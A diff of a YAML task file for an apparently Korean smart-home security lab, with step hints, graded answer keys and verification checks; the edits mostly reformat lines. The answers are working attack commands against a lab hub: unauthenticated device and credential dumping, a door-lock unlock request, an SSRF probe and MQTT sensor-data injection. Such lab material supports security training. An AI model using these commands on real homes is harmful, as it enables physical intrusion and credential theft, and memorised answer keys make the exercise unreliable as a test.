@@ -14,10 +14,11 @@ pass_threshold: 0.6
 steps:
 - order: 1
   instruction: 스마트홈 허브 API(8090)에서 디바이스 목록을 수집하시오.
-  hint: curl http://10.20.30.80:8090/api/devices를 사용하세요.
+  hint: curl http://{{WEB_IP}}:8090/api/devices를 사용하세요.
   category: recon
   points: 10
-  answer: curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool 2>/dev/null | head -15; echo '디바이스 목록 수집 완료'
+  answer: curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool
+    2>/dev/null | head -15; echo '디바이스 목록 수집 완료'
   answer_detail: 미인증 API에서 전체 디바이스 목록과 상태 정보를 수집할 수 있습니다.
   verify:
     type: output_contains
@@ -29,7 +30,8 @@ steps:
   hint: WiFi 비밀번호, MQTT 인증 정보, API 키를 확인하세요.
   category: data_leak
   points: 12
-  answer: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; echo '설정 정보 수집 완료'
+  answer: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool
+    2>/dev/null | head -20; echo '설정 정보 수집 완료'
   answer_detail: 설정 API에서 WiFi 비밀번호, MQTT 인증 정보, 클라우드 API 키 등이 노출됩니다.
   verify:
     type: output_contains
@@ -41,8 +43,9 @@ steps:
   hint: POST /api/devices/lock_front/control에 action:unlock을 전송하세요.
   category: attack
   points: 12
-  answer: "curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control \\\n     -H 'Content-Type:application/json' \\\n     -d '{\"action\":\"unlock\"}' 2>/dev/null; echo 'API 도어락 해제\
-    \ 완료'"
+  answer: "curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control\
+    \ \\\n     -H 'Content-Type:application/json' \\\n     -d '{\"action\":\"unlock\"\
+    }' 2>/dev/null; echo 'API 도어락 해제 완료'"
   answer_detail: 인증 없는 API로 도어락을 해제할 수 있으면 물리적 보안 위협이 됩니다.
   verify:
     type: output_contains
@@ -54,7 +57,8 @@ steps:
   hint: /api/webhook/test?url=http://내부IP 형식을 사용하세요.
   category: attack
   points: 10
-  answer: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null | head -5; echo 'SSRF 테스트 완료'
+  answer: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/"
+    2>/dev/null | head -5; echo 'SSRF 테스트 완료'
   answer_detail: SSRF(Server-Side Request Forgery)로 허브에서 내부 서비스에 접근할 수 있습니다.
   verify:
     type: output_contains
@@ -66,7 +70,8 @@ steps:
   hint: mosquitto_pub으로 센서 토픽에 메시지를 발행하세요.
   category: mqtt
   points: 10
-  answer: mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state' -m '{"value":-30,"unit":"C"}' 2>/dev/null && echo 'MQTT 데이터 주입 완료'
+  answer: mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state'
+    -m '{"value":-30,"unit":"C"}' 2>/dev/null && echo 'MQTT 데이터 주입 완료'
   answer_detail: MQTT 미인증 접근으로 센서 데이터를 조작하면 자동화 규칙이 오동작할 수 있습니다.
   verify:
     type: output_contains
@@ -78,8 +83,9 @@ steps:
   hint: 네트워크, 인증, 암호화 각 계층의 대책을 정리하세요.
   category: verification
   points: 10
-  answer: echo '=== 스마트홈 보안 아키텍처 ===' && echo '[네트워크] IoT 전용 VLAN + 방화벽' && echo '[인증] API JWT 토큰 + RBAC' && echo '[암호화] MQTT TLS + HTTPS' && echo '[모니터링] 이상 행위 탐지' && echo '[물리] 허브 잠금 보관' && echo '===
-    아키텍처 설계 완료 ==='
+  answer: echo '=== 스마트홈 보안 아키텍처 ===' && echo '[네트워크] IoT 전용 VLAN + 방화벽' && echo '[인증]
+    API JWT 토큰 + RBAC' && echo '[암호화] MQTT TLS + HTTPS' && echo '[모니터링] 이상 행위 탐지'
+    && echo '[물리] 허브 잠금 보관' && echo '=== 아키텍처 설계 완료 ==='
   answer_detail: 스마트홈 보안은 다층 방어(Defense in Depth) 전략을 적용해야 합니다.
   verify:
     type: output_contains
